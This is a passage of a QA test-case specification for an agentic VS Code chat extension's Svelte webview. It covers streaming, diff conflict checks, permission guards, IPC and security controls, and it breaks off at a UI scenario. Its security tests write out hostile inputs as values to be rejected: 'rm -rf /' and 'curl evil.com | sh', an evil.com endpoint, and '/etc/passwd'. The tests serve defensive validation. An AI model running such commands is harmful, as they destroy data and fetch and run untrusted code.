# System Test Cases (STC)

## SDLC Agents 4 Enterprise — SA4E-85: Nâng cấp Chat UI Agentic - Svelte Webview

---

## Document Information

| Field | Value |
|-------|-------|
| Jira Ticket | SA4E-85 |
| Author | QA Agent |
| Version | 2.0 |
| Date | 2026-08-02 |
| Related STP | STP-v2-SA4E-85.docx |

---

## 1. PBT — Property-Based Tests

### PBT-CM-01: Hash Reflexivity

| Attribute | Value |
|-----------|-------|
| **Property** | For any file content `c`, `sha256(c) === sha256(c)` always holds |
| **Generator** | `fc.string(1, 100_000)` — random file content |
| **Runs** | 1000 |
| **Framework** | fast-check + Vitest |
| **BR** | BR-05 |

```typescript
test.prop([fc.string(1, 100_000)])('hash is reflexive', (content) => {
  const h1 = computeFileHash(content);
  const h2 = computeFileHash(content);
  expect(h1).toBe(h2);
});
```

---

### PBT-CM-02: Dirty File Always Blocked

| Attribute | Value |
|-----------|-------|
| **Property** | If file is mutated after hash capture, `applyDiff()` always returns `CONFLICT` |
| **Generator** | `fc.tuple(fc.string(1,10000), fc.string(1,10000)).filter(([a,b]) => a !== b)` |
| **Runs** | 500 |
| **BR** | BR-07 |

```typescript
test.prop([fc.string(1,10000), fc.string(1,10000)])
  .filter(([orig, modified]) => orig !== modified)
  ('dirty file is always blocked', (orig, modified) => {
    const hashAtGen = computeFileHash(orig);
    const diff = createDiffBlock({ fileHashAtGeneration: hashAtGen });
    mockFileContent(modified);
    const result = applyDiff(diff);
    expect(result.error).toBe('CONFLICT');
  });
```

---

### PBT-REG-01: Invalid YAML Never Crashes

| Attribute | Value |
|-----------|-------|
| **Property** | Any arbitrary string as YAML frontmatter never crashes registry |
| **Generator** | `fc.string(0, 5000)` |
| **Runs** | 1000 |
| **BR** | BR-12 |

```typescript
test.prop([fc.string(0, 5000)])('invalid yaml never crashes', (content) => {
  const file = `---\n${content}\n---\n# Agent`;
  expect(() => parseAgentConfig(file)).not.toThrow();
});
```


---

### PBT-IPC-01: Backoff Follows Exponential Pattern

| Attribute | Value |
|-----------|-------|
| **Property** | `delay(n) = min(2^n * 1000, 16000)` for all n in 0..20 |
| **Generator** | `fc.integer(0, 20)` |
| **Runs** | 100 |
| **BR** | BR-13 |

```typescript
test.prop([fc.integer(0, 20)])('backoff is exponential capped at 16s', (n) => {
  const delay = computeBackoffDelay(n);
  const expected = Math.min(Math.pow(2, n) * 1000, 16000);
  expect(delay).toBe(expected);
});
```

---

### PBT-IPC-02: Non-Localhost Always Rejected

| Attribute | Value |
|-----------|-------|
| **Property** | Any URL not matching localhost/127.0.0.1/::1 is rejected |
| **Generator** | `fc.webUrl()` filtered to exclude localhost |
| **Runs** | 500 |
| **BR** | BR-14 |

```typescript
test.prop([fc.webUrl()])
  .filter(url => !url.includes('localhost') && !url.includes('127.0.0.1'))
  ('non-localhost always rejected', (url) => {
    expect(validateEndpoint(url.replace('http', 'ws'))).toBe(false);
  });
```

---

### PBT-PERF-01: Virtual List DOM Node Count

| Attribute | Value |
|-----------|-------|
| **Property** | For any N messages, rendered DOM nodes le 20 + buffer |
| **Generator** | `fc.integer(1, 2000)` |
| **Runs** | 200 |
| **BR** | BR-18 |

```typescript
test.prop([fc.integer(1, 2000)])('virtual list renders bounded nodes', (n) => {
  const rendered = getRenderedNodeCount(n, { viewportHeight: 600 });
  expect(rendered).toBeLessThanOrEqual(25);
});
```

---

### PBT-SEC-01: Rate Limiter Drops Excess Messages

| Attribute | Value |
|-----------|-------|
| **Property** | Messages beyond 100/s are dropped |
| **Generator** | `fc.integer(1, 500)` burst size |
| **Runs** | 200 |
| **BR** | Security Finding #1 |

```typescript
test.prop([fc.integer(1, 500)])('rate limiter caps throughput', (burst) => {
  const limiter = createRateLimiter(100);
  let accepted = 0;
  for (let i = 0; i < burst; i++) {
    if (limiter.tryAccept()) accepted++;
  }
  expect(accepted).toBeLessThanOrEqual(100);
});
```

---

### PBT-ART-01: Artifact Regex Matches Known Patterns

| Attribute | Value |
|-----------|-------|
| **Property** | Known artifact paths always detected; random non-paths never false-positive |
| **Generator** | `fc.oneof(knownPaths, fc.string())` |
| **Runs** | 500 |
| **BR** | BR-27 |

---

### PBT-STR-01: Token Buffer Flushes Before STREAM_END

| Attribute | Value |
|-----------|-------|
| **Property** | After STREAM_END, buffer is empty (all tokens delivered) |
| **Generator** | `fc.array(fc.string(1,100), {minLength:1, maxLength:200})` |
| **Runs** | 300 |
| **BR** | TDD token buffering |

---

### PBT-CTX-01: Pruning Never Removes Locked Files

| Attribute | Value |
|-----------|-------|
| **Property** | Files with locked=true are never in prune suggestions |
| **Generator** | `fc.array(contextFileArb, {minLength:1, maxLength:50})` |
| **Runs** | 300 |
| **BR** | UC-10 EF-01 |

---

## 2. UT — Unit Tests

### UT-STR-01: chatStore STREAM_START Creates Message

| Step | Action | Expected |
|------|--------|----------|
| 1 | Dispatch STREAM_START {messageId:'m1', agentId:'ba'} | New message in store with status='streaming' |
| 2 | Verify chatStore.messages length | Incremented by 1 |
| 3 | Verify message fields | id='m1', role='assistant', agentId='ba', content='' |

**Test Data:** messages.csv row 1
**BR:** UC-01

---

### UT-STR-02: chatStore STREAM_TOKEN Appends Content

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set up stream (STREAM_START) | Message created |
| 2 | Dispatch STREAM_TOKEN {messageId:'m1', token:'Hello'} | content = 'Hello' |
| 3 | Dispatch STREAM_TOKEN {messageId:'m1', token:' World'} | content = 'Hello World' |

**Test Data:** messages.csv rows 2-3
**BR:** UC-01

---

### UT-STR-03: chatStore STREAM_ERROR Sets Error State

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set up stream | Message streaming |
| 2 | Dispatch STREAM_ERROR {code:'LLM_TIMEOUT', recoverable:true} | message.status = 'error' |
| 3 | Check error field | error.code='LLM_TIMEOUT', error.recoverable=true |

**Test Data:** messages.csv row 4
**BR:** UC-01 EF-01

---

### UT-CM-01: computeFileHash Returns Consistent SHA-256

| Step | Action | Expected |
|------|--------|----------|
| 1 | Call computeFileHash('hello world') | Returns SHA-256 hex string |
| 2 | Call again with same input | Same hash returned |
| 3 | Call with different input | Different hash returned |

**BR:** BR-05

---

### UT-CM-02: Stale Patch Detection After 5 Minutes

| Step | Action | Expected |
|------|--------|----------|
| 1 | Create DiffBlock with generatedAt = now - 6min | |
| 2 | Check isStale(diff) | Returns true |
| 3 | Create DiffBlock with generatedAt = now - 3min | |
| 4 | Check isStale(diff) | Returns false |

**BR:** BR-06

---

### UT-CM-03: Concurrent Modification Blocks Apply

| Step | Action | Expected |
|------|--------|----------|
| 1 | Create DiffBlock with fileHashAtGeneration = 'abc123' | |
| 2 | Mock current file hash = 'def456' (different) | |
| 3 | Call applyDiff(diff) | Returns {success:false, error:'CONFLICT'} |
| 4 | Verify WorkspaceEdit NOT called | No edit applied |

**BR:** BR-07

---

### UT-CM-04: WorkspaceEdit Preserves Undo Stack

| Step | Action | Expected |
|------|--------|----------|
| 1 | Apply diff via applyDiff() successfully | |
| 2 | Verify WorkspaceEdit.applyEdit called (not fs.writeFile) | WorkspaceEdit used |
| 3 | Call vscode.commands.executeCommand('undo') | File reverts to pre-apply |

**BR:** BR-23

---

### UT-PG-01: Dangerous Tool Shows PermissionGuard

| Step | Action | Expected |
|------|--------|----------|
| 1 | Dispatch TOOL_CALL_REQUEST {requiresApproval:true, toolType:'write'} | |
| 2 | Query rendered component | PermissionGuard visible |
| 3 | Verify tool name displayed | Shows tool name and args |

**BR:** BR-01

---

### UT-PG-02: Safe Tool Auto-Approves

| Step | Action | Expected |
|------|--------|----------|
| 1 | Dispatch TOOL_CALL_REQUEST {requiresApproval:false, toolType:'read'} | |
| 2 | Query for PermissionGuard | NOT rendered |
| 3 | Verify TOOL_CALL_RESPONSE sent automatically | decision='APPROVE' |

**BR:** BR-02

---

### UT-PG-03: Permission Timeout Auto-Denies at 60s

| Step | Action | Expected |
|------|--------|----------|
| 1 | Show PermissionGuard for tool | Guard visible |
| 2 | Advance timer by 60000ms (vi.advanceTimersByTime) | |
| 3 | Verify TOOL_CALL_RESPONSE sent | decision='REJECT' |
| 4 | Verify guard dismissed | Not visible |

**BR:** BR-03

---

### UT-PG-04: Allow All Session Scope Per Type

| Step | Action | Expected |
|------|--------|----------|
| 1 | Click 'Allow All Session' for toolType='write' | |
| 2 | Verify toolStore.sessionApprovals contains 'write' | Added |
| 3 | New TOOL_CALL_REQUEST {toolType:'write', requiresApproval:true} | Auto-approved |
| 4 | New TOOL_CALL_REQUEST {toolType:'shell', requiresApproval:true} | Guard shown (different type) |

**BR:** BR-04, Security Finding #2

---

### UT-CTX-01: Badge Pulse Animation at >80%

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set contextStore tokenCount=8500, maxTokens=10000 (85%) | |
| 2 | Render ContextBadge | Has 'pulse' CSS class |
| 3 | Set tokenCount=7000 (70%) | No 'pulse' class |

**BR:** BR-08

---

### UT-CTX-02: Auto-Suggest Prune at >90%

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set contextStore tokenCount=9200, maxTokens=10000 (92%) | |
| 2 | Verify pruneSuggestions populated | Non-empty array |
| 3 | Verify suggestions sorted by age*0.4+size*0.3+(1-relevance)*0.3 | Correct order |

**BR:** BR-09

---

### UT-CTX-03: /clear Resets All Context

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set contextStore with 5 files, tokenCount=5000 | |
| 2 | Call clearAll() | |
| 3 | Verify tokenCount=0, files=[] | All cleared |
| 4 | Verify CONTEXT_CLEAR message sent | postMessage called |

**BR:** BR-10

---

### UT-REG-01: Hot-Reload Fires Event Within 2s

| Step | Action | Expected |
|------|--------|----------|
| 1 | Initialize registry with 2 agents | agents.length = 2 |
| 2 | Simulate file create event (new .md) | |
| 3 | Wait 2000ms max | onAgentsChanged fires |
| 4 | Verify new agent in list | agents.length = 3 |

**BR:** BR-11

---

### UT-REG-02: Invalid YAML Skipped with Warning

| Step | Action | Expected |
|------|--------|----------|
| 1 | Create .md file with invalid YAML frontmatter | |
| 2 | Trigger registry reload | |
| 3 | Verify agent NOT added | Registry unchanged |
| 4 | Verify warning logged | console.warn called |

**BR:** BR-12

---

### UT-IPC-01: Exponential Backoff Calculation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Retry 0 | delay = 1000ms |
| 2 | Retry 1 | delay = 2000ms |
| 3 | Retry 2 | delay = 4000ms |
| 4 | Retry 3 | delay = 8000ms |
| 5 | Retry 4 | delay = 16000ms |
| 6 | Retry 5+ | delay = 16000ms (capped) |

**BR:** BR-13

---

### UT-IPC-02: Localhost-Only Validation

| Step | Action | Expected |
|------|--------|----------|
| 1 | validateEndpoint('ws://localhost:8080') | true |
| 2 | validateEndpoint('ws://127.0.0.1:9090') | true |
| 3 | validateEndpoint('ws://[::1]:7070') | true |
| 4 | validateEndpoint('ws://evil.com:8080') | false |
| 5 | validateEndpoint('wss://remote:443') | false |

**Test Data:** ipc-services.csv
**BR:** BR-14

---

### UT-IPC-03: Service Offline Shows Warning

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set connectionStore service='kiro' status='offline' | |
| 2 | Render ServiceOfflineWarning | Visible with service name |
| 3 | Verify 'Auto-start' button rendered | Button present |

**BR:** UC-08

---

### UT-IPC-04: Service Discovery File Validation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Parse valid discovery JSON {ws_endpoint, pid, status} | Returns ServiceDiscovery |
| 2 | Parse JSON missing ws_endpoint | Returns null/error |
| 3 | Parse JSON with non-localhost endpoint | Returns null/error |

**BR:** Security Finding #6

---

### UT-TLB-01: Terminal Log Block Max Height 300px

| Step | Action | Expected |
|------|--------|----------|
| 1 | Render TerminalLogBlock with 500 lines of output | |
| 2 | Check computed max-height | 300px |
| 3 | Verify overflow-y: auto | Scrollable |
| 4 | Verify font-family | monospace |

**BR:** BR-21

---

### UT-TLB-02: Shell Complete Collapses to Summary

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set tool status='success', exitCode=0, duration=3400ms | |
| 2 | Verify collapsed state | Shows summary line |
| 3 | Verify summary content | 'exit 0 - 3.4s - last 3 lines...' |

**BR:** BR-22

---

### UT-ART-01: Artifact Detection Regex

| Step | Action | Expected |
|------|--------|----------|
| 1 | detect('Report: target/site/serenity/index.html') | [{label:'Test Report', path:'target/site/serenity/index.html', type:'report'}] |
| 2 | detect('No artifacts here') | [] |
| 3 | detect('Build output: dist/bundle.js') | [{path:'dist/bundle.js',...}] |

**Test Data:** See test-data/diffs.csv for artifact patterns
**BR:** BR-27

---

### UT-DL-01: Deep Link Button Renders

| Step | Action | Expected |
|------|--------|----------|
| 1 | Render ToolResult with deepLinkUri='antigravity://workspace/file' | |
| 2 | Query for button | 'Open in AntiGravity' button visible |
| 3 | Verify href | Points to deepLinkUri |

**BR:** BR-26

---

### UT-DGR-01: Diagram Renderer SVG Output

| Step | Action | Expected |
|------|--------|----------|
| 1 | Call render({type:'plantuml', source:'@startuml\nA->B\n@enduml'}) | |
| 2 | Verify result starts with '<svg' | Valid SVG |
| 3 | Call again with same source | Cache hit (no re-render) |

**Test Data:** diagrams.csv row 1
**BR:** BR-28

---

### UT-TEL-01: Telemetry Writes Locally Only

| Step | Action | Expected |
|------|--------|----------|
| 1 | Call logDiffAction('ba','accept','write_file','src/a.ts') | |
| 2 | Verify .code-intel/telemetry.jsonl has entry | JSONL line appended |
| 3 | Verify NO network calls made | No fetch/http/ws calls |

**BR:** BR-20

---

### UT-SEC-01: CSP Nonce Generation

| Step | Action | Expected |
|------|--------|----------|
| 1 | Generate nonce for panel | 16+ bytes, base64 encoded |
| 2 | Verify nonce in CSP header | script-src contains nonce |
| 3 | Generate second nonce | Different from first |

**BR:** BR-24, Security Finding #7

---

### UT-SEC-02: IPC Rate Limiter Drops Excess

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send 100 messages in <1s | All accepted |
| 2 | Send 101st message | Dropped |
| 3 | Wait 1s, send message | Accepted (window reset) |

**BR:** Security Finding #1

---

### UT-SEC-03: Terminal Command Allowlist

| Step | Action | Expected |
|------|--------|----------|
| 1 | validateTerminalCommand('kiro start') | true |
| 2 | validateTerminalCommand('antigravity start') | true |
| 3 | validateTerminalCommand('rm -rf /') | false |
| 4 | validateTerminalCommand('curl evil.com | sh') | false |

**BR:** Security Finding #5

---

### UT-A11Y-01: ARIA Labels Present

| Step | Action | Expected |
|------|--------|----------|
| 1 | Render ChatPanel | |
| 2 | Query input | aria-label='Chat input' |
| 3 | Query send button | aria-label='Send message' |
| 4 | Query agent selector | role='combobox', aria-expanded |
| 5 | Tab through all interactive elements | All reachable |

**BR:** BR-25

---

### UT-PERF-01: Virtual List Bounds

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set messages array length = 1000 | |
| 2 | Render ChatMessageList | |
| 3 | Count rendered DOM children | <= 25 |

**BR:** BR-18

---

### UT-LINT-01: Component Size Constraint

| Step | Action | Expected |
|------|--------|----------|
| 1 | Read all .svelte files in webview/src | |
| 2 | Count lines per file | Each <= 200 lines |

**BR:** BR-19

---

## 3. IT — Integration Tests

### IT-STR-01: Full Stream Flow (MessageRouter to chatStore)

| Step | Action | Expected |
|------|--------|----------|
| 1 | MessageRouter receives STREAM_START from mock backend | chatStore creates message |
| 2 | MessageRouter receives 5 STREAM_TOKENs | chatStore accumulates tokens |
| 3 | MessageRouter receives STREAM_END | message.status = 'complete' |
| 4 | Verify token buffering (16-50ms batch) | Tokens batched, not per-char |

**BR:** UC-01, TDD token buffering

---

### IT-STR-02: STREAM_ERROR Recovery with Retry

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start stream, send 3 tokens | Partial message |
| 2 | Send STREAM_ERROR {code:'BACKEND_CRASH', recoverable:true} | Error UI shown |
| 3 | User clicks Retry | SEND_PROMPT re-sent |
| 4 | New stream completes | Message finalized |

**BR:** UC-01 EF-01

---

### IT-CM-01: ToolHandler Checks Hash Against Real File

| Step | Action | Expected |
|------|--------|----------|
| 1 | Write test file with known content | File exists |
| 2 | Compute hash of file | Hash captured |
| 3 | Create DiffBlock with matching hash | |
| 4 | Call applyDiff | success=true, WorkspaceEdit applied |

**BR:** BR-05

---

### IT-CM-02: Concurrent Mod Detection End-to-End

| Step | Action | Expected |
|------|--------|----------|
| 1 | Write file, capture hash, create DiffBlock | |
| 2 | Modify file externally (simulate concurrent edit) | |
| 3 | Call applyDiff | error='CONFLICT' |
| 4 | Call regeneratePatch | New DiffBlock with fresh hash |

**BR:** BR-07

---

### IT-CM-03: WorkspaceEdit Integration with VSCode API

| Step | Action | Expected |
|------|--------|----------|
| 1 | Apply diff via real vscode.workspace.applyEdit | File modified |
| 2 | Execute undo command | File reverts |
| 3 | Execute redo command | Diff re-applied |

**BR:** BR-23

---

### IT-PG-01: Permission Round-Trip (Webview to Host)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Extension Host sends TOOL_CALL_REQUEST {requiresApproval:true} | |
| 2 | Webview renders PermissionGuard | Guard visible |
| 3 | Webview sends TOOL_CALL_RESPONSE {decision:'APPROVE'} | |
| 4 | Extension Host receives approval | Tool executes |

**BR:** BR-01

---

### IT-PG-02: Safe Tool Bypasses Guard

| Step | Action | Expected |
|------|--------|----------|
| 1 | Extension Host sends TOOL_CALL_REQUEST {requiresApproval:false} | |
| 2 | Verify no PermissionGuard rendered | Auto-approved |
| 3 | Verify tool result received | MCP_TOOL_RESULT delivered |

**BR:** BR-02

---

### IT-PG-03: Timeout Flows Through Full Stack

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send dangerous tool request | Guard shown |
| 2 | Wait 60s (advance timers) | Auto-deny triggered |
| 3 | Verify Extension Host received REJECT | Tool cancelled |
| 4 | Verify agent notified of denial | Error in stream |

**BR:** BR-03

---

### IT-PG-04: Session Approval Isolation Per Type

| Step | Action | Expected |
|------|--------|----------|
| 1 | Approve 'write' tool with 'Allow All Session' | |
| 2 | Send another 'write' tool request | Auto-approved |
| 3 | Send 'shell' tool request | Guard shown (not approved) |
| 4 | Send 'delete' tool request | Guard shown (not approved) |

**BR:** BR-04, Security Finding #2

---

### IT-CTX-01: ContextManager Prune Suggestions

| Step | Action | Expected |
|------|--------|----------|
| 1 | Pin 10 files totaling 95% tokens | |
| 2 | Verify suggestPrune() returns files | Non-empty |
| 3 | Unpin suggested file | Token count decreases |
| 4 | Verify CONTEXT_UPDATE sent to webview | Badge updates |

**BR:** BR-09

---

### IT-CTX-02: /clear Full Reset Flow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Pin 5 files, set tokens to 5000 | |
| 2 | Dispatch CONTEXT_CLEAR from webview | |
| 3 | Verify all files unpinned | Empty |
| 4 | Verify CONTEXT_UPDATE sent with 0 tokens | Badge resets |

**BR:** BR-10

---

### IT-REG-01: FileWatcher Triggers Registry Reload

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start registry watcher | Watching .code-intel/agents/ |
| 2 | Create new agent-test.md with valid YAML | |
| 3 | Wait for debounce (<2s) | onAgentsChanged fires |
| 4 | Verify SYNC_AVAILABLE_AGENTS sent to webview | Agent list includes new |

**BR:** BR-11

---

### IT-REG-02: Invalid YAML File Skipped in Batch

| Step | Action | Expected |
|------|--------|----------|
| 1 | Directory has 3 valid + 1 invalid .md files | |
| 2 | Trigger full rescan | |
| 3 | Verify 3 agents loaded | Invalid skipped |
| 4 | Verify warning log for invalid file | Logged |

**BR:** BR-12

---

### IT-IPC-01: WebSocket Connect and JSON-RPC Call

| Step | Action | Expected |
|------|--------|----------|
| 1 | Start mock WebSocket server on localhost:9999 | |
| 2 | Write discovery file {ws_endpoint:'ws://localhost:9999'} | |
| 3 | IpcBridge connects | status='connected' |
| 4 | Call bridge.call('tools/list', {}) | JSON-RPC response received |

**BR:** BR-13, BR-14

---

### IT-IPC-02: Backoff Reconnect on Drop

| Step | Action | Expected |
|------|--------|----------|
| 1 | Establish connection to mock server | connected |
| 2 | Close server (simulate drop) | status='disconnected' |
| 3 | Observe retry attempts | Delays: 1s, 2s, 4s, 8s, 16s |
| 4 | Restart server before 5th retry | Reconnects |
| 5 | Verify status='connected' | Green indicator |

**BR:** BR-13

---

### IT-IPC-03: Auto-Start Service Recovery

| Step | Action | Expected |
|------|--------|----------|
| 1 | All 5 retries exhausted | status='offline' |
| 2 | User clicks 'Auto-start' | RUN_TERMINAL_COMMAND dispatched |
| 3 | Terminal spawns, service starts | New discovery file appears |
| 4 | IpcBridge re-reads, connects | status='connected' |

**BR:** UC-08

---

### IT-DL-01: Deep Link from ToolResult to UI Button

| Step | Action | Expected |
|------|--------|----------|
| 1 | Receive MCP_TOOL_RESULT with deepLinkUri | |
| 2 | Verify ArtifactLinkButton rendered | 'Open in AntiGravity' visible |
| 3 | Click button | vscode.env.openExternal called with URI |

**BR:** BR-26

---

### IT-ART-01: Shell Output to Artifact Detection to UI

| Step | Action | Expected |
|------|--------|----------|
| 1 | Receive TOOL_STREAM_OUTPUT chunks containing path | |
| 2 | Shell completes (MCP_TOOL_RESULT) | |
| 3 | ArtifactDetector.detect() runs on output | Finds artifact paths |
| 4 | Verify ArtifactLinkButton(s) rendered in collapsed state | Buttons visible |

**BR:** BR-27

---

### IT-DGR-01: PlantUML Local Render Pipeline

| Step | Action | Expected |
|------|--------|----------|
| 1 | Receive DiagramBlock {type:'plantuml', source:'@startuml...'} | |
| 2 | DiagramRenderer calls java -jar plantuml.jar -tsvg | |
| 3 | SVG output sanitized via DOMPurify | Clean SVG |
| 4 | Rendered inline in DiagramBlock component | SVG visible |
| 5 | Same source requested again | Cache hit, no re-render |

**Precondition:** Java 11+ and plantuml.jar available
**BR:** BR-28

---

### IT-TEL-01: Telemetry Append to JSONL File

| Step | Action | Expected |
|------|--------|----------|
| 1 | logDiffAction() called | |
| 2 | logToolExec() called | |
| 3 | Read .code-intel/telemetry.jsonl | 2 JSONL lines appended |
| 4 | Verify each line is valid JSON | Parse succeeds |

**BR:** BR-20

---

### IT-SEC-01: CSP Enforcement Blocks Inline Script

| Step | Action | Expected |
|------|--------|----------|
| 1 | Set CSP header on webview panel | |
| 2 | Attempt to inject inline script via postMessage content | |
| 3 | Verify script does NOT execute | CSP violation in console |

**BR:** BR-24

---

### IT-SEC-02: IPC Rate Limiter Under Load

| Step | Action | Expected |
|------|--------|----------|
| 1 | Connect to IpcBridge | |
| 2 | Send 200 messages in 1 second burst | |
| 3 | Verify only first 100 processed | Rest dropped |
| 4 | Verify warning logged for dropped messages | Log entry |

**BR:** Security Finding #1

---

### IT-SEC-03: Terminal Command Validation Integration

| Step | Action | Expected |
|------|--------|----------|
| 1 | Receive RUN_TERMINAL_COMMAND with allowed command | Terminal spawned |
| 2 | Receive RUN_TERMINAL_COMMAND with disallowed command | Rejected, terminal NOT spawned |
| 3 | Verify rejection logged | Warning in output channel |

**BR:** Security Finding #5

---

### IT-PERF-01: First Render Under 100ms

| Step | Action | Expected |
|------|--------|----------|
| 1 | Create webview panel, start timer | |
| 2 | Wait for first contentful paint | |
| 3 | Measure elapsed time | < 100ms |

**BR:** BR-16

---

### IT-PERF-02: Extension Activation Under 200ms

| Step | Action | Expected |
|------|--------|----------|
| 1 | Deactivate extension | |
| 2 | Measure activation time | |
| 3 | Verify activation completes | < 200ms |

**BR:** BR-17

---

## 4. E2E-API — Protocol Contract Tests

### API-STR-01: STREAM_START Contract

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send SEND_PROMPT from webview | |
| 2 | Verify Extension Host sends STREAM_START | |
| 3 | Validate payload: {type:'STREAM_START', messageId:string, agentId:string} | Schema valid |
| 4 | Verify messageId is UUID format | Matches pattern |

**BR:** UC-01

---

### API-STR-02: STREAM_TOKEN Batching Contract

| Step | Action | Expected |
|------|--------|----------|
| 1 | Backend produces 20 rapid tokens | |
| 2 | Verify Extension Host batches into fewer postMessages | Batched (16-50ms) |
| 3 | Validate each batch: {type:'STREAM_TOKEN', messageId:string, token:string} | Schema valid |
| 4 | Concatenated tokens match original | Content intact |

**BR:** UC-01, TDD token buffering

---

### API-STR-03: STREAM_END Finalizes

| Step | Action | Expected |
|------|--------|----------|
| 1 | After tokens, send STREAM_END | |
| 2 | Validate: {type:'STREAM_END', messageId:string} | Schema valid |
| 3 | Verify no more STREAM_TOKENs after END | None received |

**BR:** UC-01

---

### API-STR-04: STREAM_ERROR Codes Valid

| Step | Action | Expected |
|------|--------|----------|
| 1 | Trigger each error code (6 codes from TDD Section 4.2) | |
| 2 | Validate payload structure | {type, messageId, error:{code, message, recoverable}} |
| 3 | Verify code is valid StreamErrorCode enum | One of 6 values |

**Test Data:** messages.csv error rows
**BR:** UC-01 EF-01/02

---

### API-CM-01: ACTION_ACCEPT_DIFF Contract

| Step | Action | Expected |
|------|--------|----------|
| 1 | Webview sends ACTION_ACCEPT_DIFF | |
| 2 | Validate: {type:'ACTION_ACCEPT_DIFF', diffId:string, filePath:string, patch:string} | Schema valid |
| 3 | Extension Host processes and returns result | Success or conflict |

**BR:** BR-05

---

### API-CM-02: Stale Patch Warning Message

| Step | Action | Expected |
|------|--------|----------|
| 1 | Diff generated 6 minutes ago | |
| 2 | Webview receives diff payload | |
| 3 | Verify diff.status updated to 'stale' or warning shown | Stale indicator |

**BR:** BR-06

---

### API-CM-03: REGENERATE_PATCH Flow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Webview sends REGENERATE_PATCH {diffId, filePath} | |
| 2 | Extension Host generates new patch | |
| 3 | New TOOL_CALL_REQUEST with fresh DiffBlock received | New hash |

**BR:** BR-07

---

### API-PG-01: TOOL_CALL_REQUEST for Dangerous Tool

| Step | Action | Expected |
|------|--------|----------|
| 1 | Extension sends TOOL_CALL_REQUEST | |
| 2 | Validate: {type, toolId, name, args, requiresApproval:true, toolType:'write'} | Schema valid |
| 3 | Verify all required fields present | No missing |

**BR:** BR-01

---

### API-PG-02: TOOL_CALL_RESPONSE APPROVE

| Step | Action | Expected |
|------|--------|----------|
| 1 | Webview sends {type:'TOOL_CALL_RESPONSE', toolId:'t1', decision:'APPROVE'} | |
| 2 | Extension Host receives | Tool proceeds |
| 3 | MCP_TOOL_RESULT returned eventually | Success |

**BR:** BR-01

---

### API-PG-03: TOOL_CALL_RESPONSE REJECT (Timeout)

| Step | Action | Expected |
|------|--------|----------|
| 1 | Timeout triggers auto-REJECT | |
| 2 | Webview sends {type:'TOOL_CALL_RESPONSE', toolId:'t1', decision:'REJECT'} | |
| 3 | Extension Host cancels tool | No execution |

**BR:** BR-03

---

### API-PG-04: Session Approval Bypass

| Step | Action | Expected |
|------|--------|----------|
| 1 | First 'write' tool → APPROVE with session flag | |
| 2 | Second 'write' tool → no TOOL_CALL_REQUEST with requiresApproval | Auto-approved at host level |
| 3 | 'shell' tool → TOOL_CALL_REQUEST with requiresApproval:true | Different type, guard shown |

**BR:** BR-04

---

### API-CTX-01: CONTEXT_UPDATE + UNPIN Flow

| Step | Action | Expected |
|------|--------|----------|
| 1 | Extension sends CONTEXT_UPDATE {tokenCount:8000, maxTokens:10000, files:[...]} | |
| 2 | Webview sends CONTEXT_UNPIN_FILE {filePath:'src/old.ts'} | |
| 3 | Extension sends new CONTEXT_UPDATE with reduced count | tokenCount decreased |

**BR:** BR-10

---

### API-DL-01: MCP_TOOL_RESULT with deepLinkUri

| Step | Action | Expected |
|------|--------|----------|
| 1 | Extension sends MCP_TOOL_RESULT with result.deepLinkUri set | |
| 2 | Validate payload includes deepLinkUri field | URI present |
| 3 | Verify URI scheme (antigravity:// or similar) | Valid scheme |

**BR:** BR-26
---

### API-VALIDATE-01: Invalid Message Type Dropped

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send message with type='UNKNOWN_TYPE' | Dropped silently |
| 2 | Verify warning logged | Log entry |

---

### API-VALIDATE-02: Empty messageId Rejected

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send STREAM_START with messageId='' | Rejected |

---

### API-VALIDATE-03: Invalid agentId Returns Error

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send SEND_PROMPT with agentId='nonexistent' | STREAM_ERROR AGENT_NOT_FOUND |

---

### API-VALIDATE-04: Non-Workspace filePath Rejected

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send ACTION_ACCEPT_DIFF with filePath='/etc/passwd' | Rejected |

---

### API-VALIDATE-05: Invalid Diff Format Blocked

| Step | Action | Expected |
|------|--------|----------|
| 1 | Send ACTION_ACCEPT_DIFF with patch='not valid' | Blocked |
---

## 5. E2E-UI -- Gherkin Scenarios

### UI-STR-01: Send Prompt and See Streamed Response

| Step | Action | Expected |
|------|--------|----------|
| 1 | Open chat panel, select agent "ba-agent" | Panel visible |
| 2 | Type "Explain this code" in input | Text entered |
| 3 | Click Send | Loading indicator shown |
| 4 | Observe streaming tokens | Tokens appear incrementally |
| 5 | Wait for completion | Status = complete |

---

### UI-CM-01: Accept Clean Diff

| Step | Action | Expected |
|------|--------|----------|
| 1 | Agent generates diff for src/utils.ts | ActionableDiff rendered |
| 2 | File not modified since generation | No conflict |
| 3 | Click Accept | Status = Applied, green badge |

---

### UI-CM-02: Stale Warning After 5min

| Step | Action | Expected |
|------|--------|----------|
| 1 | Diff generated 6 minutes ago | |
| 2 | Observe diff in chat | Yellow banner "Patch may be outdated" |

---

### UI-CM-03: Concurrent Mod Block and Regenerate

| Step | Action | Expected |
|------|--------|----------|
| 1 | Agent generates diff for src/app.ts | |
| 2 | Edit src/app.ts externally | File dirty |
| 3 | Click Accept | Alert "File Modified", Accept disabled |
| 4 | Click "Regenerate Patch" | New diff appears |

---

### UI-CM-04: Reject Diff

| Step | Action | Expected |
|------|--------|----------|
| 1 | Agent generates diff | ActionableDiff shown |
| 2 | Click Reject | Status = Rejected, red badge |
| 3 | Verify file unchanged | No modification |

---

### UI-PG-01: Approve Dangerous Tool

| Step | Action | Expected |
